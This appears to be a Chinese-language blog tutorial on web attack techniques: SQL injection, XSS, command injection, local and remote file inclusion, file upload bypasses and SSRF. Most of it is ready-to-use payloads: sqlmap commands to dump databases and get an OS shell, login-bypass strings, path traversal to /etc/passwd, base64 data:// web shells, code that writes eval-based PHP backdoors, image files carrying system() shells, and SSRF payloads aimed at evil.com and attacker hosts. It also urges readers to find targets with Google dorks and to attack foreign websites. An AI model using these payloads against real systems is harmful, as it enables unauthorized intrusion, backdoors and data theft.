


![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/7ff152aab6df448793d077351aa89974.png)



# SQL

sql漏洞多见于后台登录页面，查询页面，以及传参的地方，列如php?id=1，sql注入漏洞的原理为，由于网站没过滤系统查询的参数，从而导致我们可以利用查询来获取账号密码或者一些其他信息，还可以往数据库里写一个小马来获取shell

我用以下代码举例：

```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '
<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "
<pre>ID: {$id}
First name: {$first}
Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

![](https://img-blog.csdnimg.cn/img_convert/f32cbef9bb5570e62081a64639f23f27.png)
通过id这个参数，可以看到这个代码里并没有过滤和防护的代码，我们可以直接利用id往mysql数据库里查询东西

而sql漏洞也分为了三种

## 数字型

```
select * from tables where id = 1;
```

数字型多见于url栏里
![](https://img-blog.csdnimg.cn/img_convert/42badabb0f6e9dbada353fc5fbb0f9a2.png)
测试的方式也很简单，我们可以直接在这个数字的后面加上一些符号来判断有没有sql注入漏洞

```
'
dawdasda  #无意义的英文字母，看网站会不会带入查询
```

![](https://img-blog.csdnimg.cn/img_convert/a83d81e70d8d80b797303094cdb43b63.png)
在数字后加入了一个'符号，使代码闭合错误，就会报错，说明存在sql注入漏洞
![](https://img-blog.csdnimg.cn/img_convert/fcf54dd44df7edefb2ad5d01f6f03305.png)
加入了一大堆无意义的英文字母后也报错了，它将我们输入的东西也带入了查询，说明存在sql注入漏洞
之后就可以选择是用工具去注入还是手动去注入，笔记：

```
MYSQL注入思路框架：
1.信息搜集：数据库用户名，数据库版本，数据库名，操作系统
2.数据注入：mysql低版本（暴力查询或结合读取查询），mysql高版本（information_schema有据查询）
3.高权限注入：常规查询（数据注入），跨库查询（利用注入进行数据库查询），文件读写（利用注入进行文件读写）

猜测网站数据库的字段数 ：order by x
报错联合查询：?id=-1 union select 1,2,3,4
数据库版本：version()
数据库名：database()
数据库用户：user()
操作系统：@@version_compile_os


information_schema.schemata:记录所有的数据库名
information_schema.tables : 记录所有表名的表
information_schema.columns : 记录所有列的表
schema_name:数据库名
tables_name :表名
columns_name :列名
tables_schema :指定表里的数据库名

获取所有的数据库名
首先通过?id=-1 order by 1,2,3,4,5,6来查询数据库的字段数，数字依次增加，直到网站报错前即可
```

```
?id=-1 union select 1,group_concat(schema_name),2,3,4 from information_schema.schemata

查询指定数据库下的表名信息
?id=-1 union select 1,group_concat(table_name),2,3,4 from information_schema.tables where table_schema = '数据库名'

查询指定表下的列名信息
?id=-1 union select 1,group_concat(column_name),2,3,4 from information_schema.columns where table_name = '表名'

查询指定列下的数据信息
?id=-1 union select 1,列名,2,3,4 from 表名

猜解多个数据：limit x,1

文件读写操作：
load_file() :读取函数
load_file(/etc/passwd)

into outfile 或者 into dumpfile ：导出写入函数
```

现在一般都是用工具注入了，sqlmap直接跑即可

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
```

还可以直接--os--shell来获取shell

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --os--shell
```



## 字符型

```
select * from tables where username = 'darkid';
```

多见于后台登录框或者搜索框
直接用burp测试即可
![](https://img-blog.csdnimg.cn/img_convert/cc336998a581bcf95da16bc2577ee319.png)
或者保存这个包，用sqlmap跑，之后测试就和上面一样了

```
sqlmap -r '1.txt' --technique E --dbs
```



## 搜索型

多见于搜索框

```
select * from tables where id like '%darkid%';
```

判断是否存在漏洞

```
'and 1=1 and '%'='
%' and 1=1--'
%' and 1=1 and '%'='
```

平常很少见，如果遇到了可以用sqlmap跑

## 万能密码

后台登录时可以直接测试万能密码

```
' or 1='1
'or'='or'
admin
admin'--
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*
something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1
```



## GoogleHack语法搜索

```
中国inurl:.php id
```

![](https://img-blog.csdnimg.cn/img_convert/1e795e13ad0dc4a6029bcf706d000867.png)
直接练习即可，这里推荐去渗透国外的网站

```
inurl:.php?id
```

![](https://img-blog.csdnimg.cn/img_convert/4df965f58b2673a770ca2e6ce8c3ab02.png)

## 总结

sql注入很常见，现在一般都是盲注了，用sqlmap跑也可以，一些关于sql注入的文章

```
https://book.hacktricks.xyz/pentesting-web/sql-injection
https://blog.csdn.net/haoge1998/article/details/124197807
```

之后会写关于如何绕过waf的文章，sql注入的利用方法也有很多，时间注入，布尔注入，base64注入之类的，也可以去学习相关的知识
学会自己去搜集知识学习，然后归纳成自己的
每天学着碎片化的东西，不总结成自己的 = 白学

# XSS

xss漏洞现在也挺常见的，某些大企业的网站也有xss漏洞，下面会举例的，xss漏洞的原理是攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的

XSS漏洞也分为了三种

## 反射型xss

反射型的xss很多漏洞平台都不会收，反射型xss经过后端服务处理，但不存储数据库中
反射型xss多见于搜索框里，利用原理如下

```
<p></p>
```

然后搜索，之后后端就会执行这个Script 代码

```
<p><script>alert(1)</script></p>
```

然后就会弹出来一个提示框
![](https://img-blog.csdnimg.cn/img_convert/36ffb5f486aa1570bee29db75ef062f3.png)
用处不是很大，也很常见，所以很多漏洞平台都不会收

## 存储型xss

存储型xss会经过后端服务处理，并且数据存储在数据库端，这种xss多见于用户资料，文件上传，论坛、博客、留言板、网站的留言、评论、日志等交互处
存储型ⅩSS攻击的流程如下

```
1.用户提交了一条包含XSS代码的留言到数据库
2.当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来
3.浏览器发现有XSS代码，就当做正常的HTML和JS解析执行
```

抖音修改个人资料造成存储型xss

```
https://aidilarf.medium.com/stored-xss-at-https-www-tiktok-com-11fed6db0590
```

推特修改地图造成存储型xss

```
https://hamzadzworm.medium.com/how-i-got-a-bug-that-leads-to-takeover-accounts-of-any-user-who-view-my-profile-913c8704f6cd
```

利用方法很多，可以多去看看xss漏洞提交成功的文章，基本都是存储型xss

## DOM型xss

DOM型xss不经过后端服务处理，并且不存储数据库里，在应用程序里包含一些 JavaScript 脚本时出现，这些 JavaScript 以不安全的方式处理来自不受信任来源的数据，通常是将数据写回 DOM。
在以下示例中，应用程序使用一些 JavaScript 从输入字段读取值并将该值写入 HTML 中的元素：

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

如果攻击者可以控制输入字段的值，他们可以轻松构造一个恶意值，导致他们自己的脚本执行：

```
You searched for: <img src=1 onerror='<script>alert(1)</script>'>
```

DOM型xss它的利用流程是这样的：

```
1.攻击者寻找具有漏洞的网站
2.攻击者给用户发了一个带有恶意字符串的链接
3.用户点击了该链接
4.服务器返回HTML文档，但是该文档此时不包含那个恶意字符串
5.客户端执行了该HTML文档里的脚本，然后把恶意脚本植入了页面
6.客服端执行了植入的恶意脚本，XSS攻击就发生了
```

反射型XSS与DOM型区别：

```
1、反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本;
2、DOM型xss攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；非恶意脚本是在其执行本地恶意脚本后，被注入到文档里的
```



## 总结

xss漏洞的攻击者通常能够：

```
冒充或伪装成受害用户。
执行用户能够执行的任何操作。
读取用户能够访问的任何数据。
捕获用户的登录凭据。
将木马功能注入网站。
```

xss攻击也需要绕过waf，之后也会写
一些关于xss的文章

```
https://www.freebuf.com/articles/web/289263.html
https://portswigger.net/web-security/cross-site-scripting
```

学会自己去搜集知识学习，然后归纳成自己的
每天学着碎片化的东西，不总结成自己的 = 白学

# 命令注入

命令注入（也称为 shell 注入）是一种 Web 安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统命令，这个漏洞比较少见，但不代表没有，存在命令注入多半都算是高危漏洞了

一些疑似存在命令注入的参数：

```
?cmd=
?exec=
?command=
?execute
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=
```

测试的命令：

```
ls||id;
ls|id;
ls&&id;
ls&id;
ls %0A id
```

不止在url传参界面有这个漏洞，还会在其他的传参界面存在，列如我写的这篇文章
[https://blog.csdn.net/qq_45894840/article/details/127727429?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_45894840/article/details/127727429?spm=1001.2014.3001.5501)
![](https://img-blog.csdnimg.cn/img_convert/a7b800f46e41a53d1828cad49a3a47af.png)
在文件上传界面也有命令注入的漏洞，可以遇到有传参的界面就去测试
如果需要输入空格，可以用以下命令代替空格

```
${IFS}
+
```



# LFI && RFI

本地文件包含漏洞无论是在挖洞的时候和打ctf比赛的时候都会遇到，当用户可以通过某种方式控制将由服务器加载的文件时，就会出现此漏洞。
易受攻击的**PHP 函数**：require、require_once、include、include_once
而远程文件包含比较少见，因为在php中这是默认**禁用**的函数
容易存在文件包含漏洞的参数

```
?cat=
?dir=
?action=
?board=
?date=
?detail=
?file=
?download=
?path=
?folder=
?prefix=
?include=
?page=
?inc=
?locate=
?show=
?doc=
?site=
?type=
?view=
?content=
?document=
?layout=
?mod=
?conf=
```



## 什么是本地文件包含，什么是远程文件包含

本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。 远程文件包含就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。

```
本地文件包含http://example.com/index.php?page=../../../etc/passwd

远程文件包含：http://example.com/index.php?page=http://baimao.com/exploit.txt
```



## 测试方法

```
http://example.com/index.php?page=../../../etc/passwd
```

编码绕过

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
http://example.com/index.php?page=/var/www/../../etc/passwd
```

windows的一些默认路径

```
c:\boot.ini // 查看系统版本
c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
c:\windows\repair\sam // 存储Windows系统初次安装的密码
c:\ProgramFiles\mysql\my.ini // MySQL配置
c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
c:\windows\php.ini // php 配置信息
```



## PHP伪协议

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。
![](https://img-blog.csdnimg.cn/img_convert/cdaa73713c8dd6da6149c602ee5e2881.png)

## filter

php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用；在文件包含中用于读取文件内容，读取后输出base64编码后的内容，要获取真实内容的话，需要进行base64解码

```
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=../sss.php
```




## file

利用file协议执行任意文件读取：

```
?file=file://C:/windows/win.ini
```



## data

通过data协议可以直接执行命令，利用条件：

```
php > 5.2
allow_url_fopen=On && allow_url_include=On
```

paylaod：

```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```



## expect

使用expect协议可以直接执行系统命令

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```



## input

input协议是个可以访问请求的原始数据的只读流。使用时，将要输入的数据以post方式提交
利用条件：

```
1. PHP.ini 中 allow_url_include= On
2. php <5.0 ，allow_url_include=Off 也可以
```



### 读取目录结构

```
<?php print_r(scandir("C:\phpStudy\PHPTutorial\WWW"))?> #改成想查看的路径即可
```



### 写入木马

```
GET:<?php fputs(fopen('shell.php','w'),'<?=`{${~"\xa0\xb8\xba\xab"}[1]}`;');?>
POST:<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>
```




## phar

phar协议数据流包装器自PHP 5.3.0起开始。这个参数是就是php解压缩包的一个函数，不管目标文件后缀是什么，都将其当做压缩包来解压
利用条件：

```
PHP>= 5.3.0
```

payload

```
?file=phar://压缩包/内部文件
```



## zip

zip伪协议和phar协议类似,但是用法不一样
利用条件：

```
5.2.17 =<php <= 7.0.12
```

payload：

```
?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]zip://xxx.png#shell.php或zip://xxx.zip#shell.php
```





## 日志文件包含

Linux存储路径

```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

Windows存储路径

```
D:\xampp\apache\logs\access.log
D:\xampp\apache\logs\error.log
C:\WINDOWS\system32\Logfiles
%SystemDrive%\inetpub\logs\LogFiles
C:/Windows/system32/inetsrv/metabase.xml
C:\Windows\System32\inetsrv\config\applicationHost.config
```



### apache/nginx报错日志

利用条件：

```
需要知道服务器日志的存储路径，且日志文件可读
```

利用原理：

```
web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log
```

正常的php代码已经写入了 error.log，包含即可执行代码

利用文件包含漏洞去包含log文件：




## ssh登录日志

利用条件:

```
需要知道ssh-log的位置，且可读
```

ssh日志默认位置：

```
/var/log/auth.log（默认情况下，所有用户都可读）
/var/log/secure
```

payload：使用终端执行以下命令

```
ssh '<?php phpinfo();?>'@IP
```


## 远程文件包含绕过



### 问号绕过

```
?file=http://192.168.91.139/phpinfo.php?
```



### 井号绕过

```
?file=http://192.168.91.139/phpinfo.php#
```

这里推荐一个方便测试本地文件包含的工具

```
https://github.com/kurobeats/fimap
```

参数：

```
./fimap.py -u http://192.168.56.103/fileincl/example1.php?page=
```

![](https://img-blog.csdnimg.cn/img_convert/c22fa8d153c55ecbcdf67299bf86cb18.jpeg)
fuzz字典

```
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
```



# 文件上传

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。

不同的Web服务执行的脚本格式可能会有所不同，那么扩展名也会不同，通常Web服务的脚本类型来决定扩展名
常见的脚本解析扩展名

```
PHP: 
.php, .php2, .php3, .php4, .php5, .php6,.php7,
.phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml,
.htaccess, .phar, .inc, .hphp,.ctp, .module

在PHP8版本中仅支持: 
.php, .php4, .php5, .phtml, .module, .inc, .hphp

ASP: 
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd,
.cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, 
.asa, .cer,.shtml

Jsp: 
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

Coldfusion：
.cfm、.cfml、.cfc、.dbm

Flash: .swf

Perl:
.pl, .cgi

Erlang Yaws Web Server: 
.yaws
```



## 绕过文件扩展名检查

1.大小写绕过、更改字母大小写

```
如 .PHp, .pHP5, .PhAr ...
```

2.使用以前的扩展

```
如 file.png.php file.png.php5
```

3. 在末尾添加特殊字符(也可以配合Burp进行爆破所有的ascii和Unicode字符)

```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
```

4.尝试添加加倍扩展或者扩展之间添加空字节，等技术来绕过欺骗服务器端扩展解析器的保护。还可以使用以前的扩展来准备更好的Payload。

```
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
```

5.在之前的检查基础上再增加一层扩展

```
file.png.jpg.php
file.php%00.png%00.jpg
```

6.可将执行脚本扩展名放入有效扩展名之前(看服务器配置有没有错误，运气问题，对于利用Apache错误配置很有用)

```
例如：file.php.png
```

7.在Windows中使用NTFS备用数据流(ADS) 在这种情况下插入一个冒号符号":"比如服务器禁止带有扩展名的空文件下

```
例如 file.asax:.jpg
也可以使用::$data 模式也可用于创建非空文件
例如 file.asp::$data
```

8.尝试打破文件名限制，有效的文件名被切断，恶意的PHP就留下来了。AAA<--SNIP-->AAA.php

```
# Linux 最大字节为255字节,利用metasploit脚本生成
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 在这里减去4字节 并加入 .png

# 上传文件并检查响应允许的字符数。比方说236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 制作有效Payload，前面是232个字节A剩下4个位置
AAA<--SNIP 232 A-->AAA.php.png
```

关于在Windows中使用NTFS 备用数据流 (ADS)可以参考这篇文章

```
https://www.cnblogs.com/zUotTe0/p/13455971.html
```



## 绕过内容类型、文件头

1. 更改Content-Type请求头

```
image/png 、text/plain 、 application/octet-stream 

更多内容类型词表
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt
```

2. 通过在文件开头添加**真实图像的字节来**绕过**文件头检查**（混淆_文件_命令）。

在图片的**元数据中引入 shell **：

```
exiftool -comment="<?php phpinfo(); ?>" nasa.png
```

![](https://img-blog.csdnimg.cn/img_convert/3a00505bcb1b1af0dceb96e28eb10410.png)
最后将nasa.png 重命名为nasa.php ，将其上传到应用程序，Web 服务器会将文件解释为 PHP 脚本，忽略原始 PNG 文件的所有合法数据，并简单地执行我们在文件注释部分中找到的 PHP 负载。
![](https://img-blog.csdnimg.cn/img_convert/02534538d386d5c1d9e1b14951d30057.png)
也可以**直接**在图像中引入有效载荷，用法和上一个一致

```
echo '<?php system($_REQUEST['cmd']); ?>' >> hh.png
```

![](https://img-blog.csdnimg.cn/img_convert/a19347c1b644152024d4761410812fe8.png)

## 特殊的扩展技巧

在得知中间件的情况下可以尝试利用中间件配置文件的特性尝试图片扩展限制

### **.htaccess特性**

.htaccess仅支持Apache，这个文件通常叫伪静态文件，是apache的配置文件，会涉及到网址脚本格式的解析规则，我们可以通过这个文件实现解析的自定义

```
<FilesMatch "jpg">//文件匹配到这个文件名
SetHandler application/x-httpd-php//将以php的文件类型格式执行
</FilesMatch>  
 
或者是这个
AddType application/x_httpd_php jpg
```

先上传.htacces文件后上传hh.jpg的图片马，访问hh.jpg，可以看见文件是以php格式执行
![](https://img-blog.csdnimg.cn/img_convert/a46696ce947e78199e83c5486b85d091.png)

### .user.ini**特性**

.user.ini只能用于Server API为FastCGI模式下，正常情况下apache不运行此模块

```
auto_prepend_file=hh.jpg  文件前插入
auto_append_file=hh.jpg   文件最后插入
```

通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。.user.ini局限是php文件可以包含该指定的文件,如果你不访问目标网址php文件那就不能包含图片马，也使用不了，如果访问了目录上的php文件，就能解析图片马，这就是.user.ini的利用方式。
上传配置文件

```
auto_append_file=2.png
```

![](https://img-blog.csdnimg.cn/img_convert/a0e6519891e7f4e0edf3eb87d8286e76.png)
上传图片前，先访问php文件，可以看见没有任何问题
![](https://img-blog.csdnimg.cn/img_convert/8eea445a9dc2bcad6e26e0643ae91625.png)
上传图片马
![](https://img-blog.csdnimg.cn/img_convert/3c1518758d460d557b15840c718ba754.png)
再次访问php文件，成功包含图片马的脚本内容
![](https://img-blog.csdnimg.cn/img_convert/50ce6c72e1db53be6548b8959be66a14.png)

## 从文件上传到其他漏洞

通过设置文件名来测试是否有其他漏洞存在的可能性

### 目录遍历

```
../../../tmp/lol.png
```



### SQL 注入

```
sleep(10)-- -.jpg
```



### 实现XSS

```
<svg onload=alert(document.domain)>
```



### 命令注入

```
; sleep 10;
```



## 总结

文件上传危害是很大的，一般上传成功之后直接getshell，通过前面的信息收集并测试payload来提高上传的成功率，最后还可以尝试利用文件名来扩大漏洞的范围性。

# SSRF

服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。
![](https://img-blog.csdnimg.cn/img_convert/f4d34c8c447a9f05f4ab75ae0a3e4d14.png)

我用一下代码举例:
![](https://img-blog.csdnimg.cn/img_convert/86f7c32ce35320da730a432bd9425939.png)

```
<?php
if(isset($_GET['url']) && $_GET['url'] != null){

    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;

}

?>
```

通过url这个参数进行传参，可以看见代码没有进行任何过滤，导致了可以利用url进行协议攻击

## 漏洞验证

1. 排除法：浏览器F12查看源代码看是否是在本地进行了请求

```
比如：该资源地址类型为 http://www.xxx.com/a.php?url=（地址）的就可能存在SSRF漏洞
```

2. 盲打：利用dnslog等平台进行测试，查看是否存在回显

```
http://dnslog.cn/
http://ceye.io
```

![](https://img-blog.csdnimg.cn/img_convert/b3b3224f258f4d8699660de49aaa31b2.png)

3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址

![](https://img-blog.csdnimg.cn/img_convert/b9f213aeb4b144162a408d90c25b7c06.png)

一些可能存在SSRF的功能点

```
1.社交分享功能：获取超链接的标题等内容进行显示

2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3.在线翻译：给网址翻译对应网页的内容

4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验

6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试

7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

8.数据库内置功能：数据库的比如mongodb的copyDatabase函数

9.邮件系统：比如接收邮件服务器地址

10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞
```

一些的url中的关键字：

```
share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
```



## 利用方式



### http

主要用于探测内网主机存活、端口开放情况，利用上面编好的SSRF漏洞来测试一下：

- 探测一下本地是否存在mysql服务器

```
?url=127.0.0.1:3306
```

![](https://img-blog.csdnimg.cn/img_convert/e116027e1c4da5754a85e570725b0b0a.png)
伪造请求探测服务器的其他端口
![](https://img-blog.csdnimg.cn/img_convert/fa19346af1d4c9989f04176cb0ab312e.png)
如果对url后缀有限制则可以用?或者#绕过

```
?url=127.0.0.1:3306/?
?url=127.0.0.1:3306/#
```



### file

尝试配合 file 协议来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息

```
file:///etc/hosts
```

还可以尝试读取 /proc/net/arp 或者 /etc/network/interfaces 来判断当前机器的网络情况

```
file:///proc/net/arp
file:///etc/network/interfaces
```



### SFTP

sftp代表SSH文件传输协议，通过sftp协议获取SSH相关信息

```
ssrf.php?url=sftp://evil.com:11111/
```

kali监听4444端口等待回显
![](https://img-blog.csdnimg.cn/img_convert/0c262dce087f05e47680c295daff2fe1.png)
在存在SSRF处输入Payload

```
sftp://192.168.3.14:4444
```

![](https://img-blog.csdnimg.cn/img_convert/408c6b04ab66d1265e614b390e1f0ee3.png)
![](https://img-blog.csdnimg.cn/img_convert/278afa38f58312f3a2d1d72c5fe7a891.png)

### TFTP

普通文件传输协议用于，在 UDP 上工作

```
ssrf.php?url=tftp://evil.com:1/TESTUDPPACKET
```

```
http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET 
evil.com:# nc -lvup 1337
Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3
```



### LDAP

ldap://或ldaps:// 或ldapi:// 轻量级目录访问协议。它是一种在IP网络上用于管理和访问分布式目录信息服务的应用协议。

```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```



### dict

DICT URL 方案用于引用使用 DICT 协议可用的定义或单词列表，可以用来操作内网Redis等服务，字典协议自带头尾，限制较大，不能转化成GET或者POST的请求

```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口

```
dict://xx.xx.xx.xx:port
```

![](https://img-blog.csdnimg.cn/img_convert/efeecaf90968005548a51f8b5899dbf3.png)

### Gopher

Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

```
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

支持换行可以伪造其他的所有协议，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。

推荐一个基于利用Gopher协议的工具

```
https://github.com/tarunkant/Gopherus
```

此工具为以下各项服务生成 Gopher协议 有效Payload：

```
MySQL
PostgreSQL
FastCGI
Redis
Zabbix
Memcache
```

关于工具用法可以参考这篇文章

```
